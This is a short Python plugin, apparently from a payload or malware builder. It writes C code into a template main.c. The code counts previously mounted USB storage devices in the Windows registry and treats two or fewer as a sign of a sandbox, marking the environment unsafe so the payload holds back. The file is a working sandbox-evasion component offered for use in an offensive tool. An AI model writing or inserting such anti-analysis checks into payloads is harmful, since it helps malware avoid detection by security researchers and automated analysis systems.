def desc():
    return "Check USB plugged in history to detect sanboxes"

def run():
    libs = '''\
#define MIN_USB 2 // 2 USBs previously mounted
'''

    functions = '''\
int checkUSBHistory() {
    HKEY    hKey            = NULL;
    DWORD   dwUsbNumber     = NULL;
    DWORD   dwRegErr        = NULL;

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\\\ControlSet001\\\\Enum\\\\USBSTOR", NULL, KEY_READ, &hKey);

    RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &dwUsbNumber, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

    return (dwUsbNumber <= MIN_USB);
}
'''

    keying = '''\
	if (checkUSBHistory())
		SafeEnv = FALSE;\
'''

    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{LIBS}}", libs + "\n{{LIBS}}") \
                              .replace("{{FUNCTIONS}}", functions + "\n{{FUNCTIONS}}") \
                              .replace("{{KEYING}}", keying + "\n{{KEYING}}")

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)

    return